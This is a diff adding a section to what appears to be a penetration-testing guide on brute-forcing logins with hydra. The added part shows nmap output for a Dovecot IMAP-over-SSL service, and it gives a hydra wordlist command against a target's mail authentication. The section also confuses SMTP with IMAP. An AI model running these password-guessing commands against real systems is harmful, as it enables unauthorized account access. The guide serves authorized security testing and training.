@@ -29,3 +29,15 @@ Where `HTML FORM USERNAME ATTRIBUTE` is the HTML form username "name" attribute.
   ... `:username=^USER^&passwd=^PASS^` ...
   
   `hydra` will fill in the `^USER^` and `^PASS^` values upon every single HTTP request with each username and password that you mean to test.
+  
+## SMTP (IMAP SSL)
+To brute force SMTP via SSL Authentication, you must first enumerate which port ssl/imap is runniing on using `nmap`. In our case, we found port 993 as,
+
+```
+993/tcp  open  ssl/imap   Dovecot imapd
+|_imap-capabilities: ID more IDLE have IMAP4rev1 ENABLE LOGIN-REFERRALS SASL-IR LITERAL+ listed capabilities Pre-login post-login AUTH=PLAINA0001 OK
+```
+
+We also need to enumerate a valid username. We can hlearn how to do so from the [SMTP User Enumeration Module](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Enumeration/smtp-user-enumeration.md). After gathering these two pieces of information, we can use `hydra` to try to brute force the authentication like so:
+
+`root@kali:~# hydra (TARGET IP ADDRESS) smtp -l (USERNAME) -P /path/to/wordlist.txt -V -s (TARGET PORT)`
